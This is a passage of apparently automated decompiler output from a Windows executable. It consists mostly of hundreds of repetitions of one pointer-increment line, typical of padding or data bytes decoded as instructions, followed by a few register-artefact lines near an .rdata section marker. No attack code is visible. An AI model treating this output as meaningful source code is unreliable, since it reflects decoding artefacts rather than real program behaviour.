= *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar5 = *pcVar5 + unaff_EBX;\n    // [02] -r-- section size 4096 named .rdata\n    pcVar2[in_FS_OFFSET] = pcVar2[in_FS_OFFSET] + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    puVar8 = unaff_ESI & 0xffffff00 | unaff_ESI + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    pcVar2 = in_GS_OFFSET + (pcVar2 & 0xffff0000 | CONCAT11((uVar6 >> 8) + (unaff_EBX >> 8), cVar1));\n    *pcVar2 = *pcVar2 + cVar1;\n    Var7 = func_0x0040608a();\n    uVar4 = Var7 >> 0x20;\n    pcVar2 = Var7;\n    cVar1 = Var7;\n    *pcVar2 = *pcVar2 + cVar1;\n    *0x900000ca = *0x900000ca + unaff_EBX;\n    pcVar2[in_GS_OFFSET] = pcVar2[in_GS_OFFSET] + cVar1;\n    *unaff_EBP = '\\0';\n    out(uVar4, cVar1);\n    pcVar2[in_FS_OFFSET] = pcVar2[in_FS_OFFSET] + cVar1;\n    *unaff_EBP = *unaff_EBP + (Var7 >> 8);\n    cVar3 = Var7 >> 0x20;\n    *0x652a0000 = *0x652a0000 + cVar3;\n    *pcVar2 = *pcVar2 + cVar1;\n    pcVar2[0x65] = pcVar2[0x65] + cVar3;\n    *pcVar2 = 